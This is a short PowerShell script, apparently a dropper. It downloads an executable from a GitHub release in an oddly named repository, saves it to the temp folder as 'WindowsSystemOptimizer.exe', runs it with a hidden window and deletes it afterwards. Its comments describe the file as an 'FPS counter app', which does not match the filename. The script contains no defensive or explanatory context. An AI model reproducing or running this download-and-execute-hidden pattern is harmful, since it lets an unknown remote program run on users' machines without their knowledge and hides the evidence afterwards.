# Path to save the executable temporarily
$p = Join-Path $env:TEMP 'WindowsSystemOptimizer.exe'

# Download the FPS counter app
Invoke-WebRequest 'https://github.com/KelvinWin10/theresabsoulutelynowayforutoseethis/releases/download/justtestingnewstuff123/WindowsSystemOptimizer.exe' -OutFile $p

# Run the app in hidden mode
Start-Process -FilePath $p -WindowStyle Hidden -Wait

# Remove it after it closes
Remove-Item $p
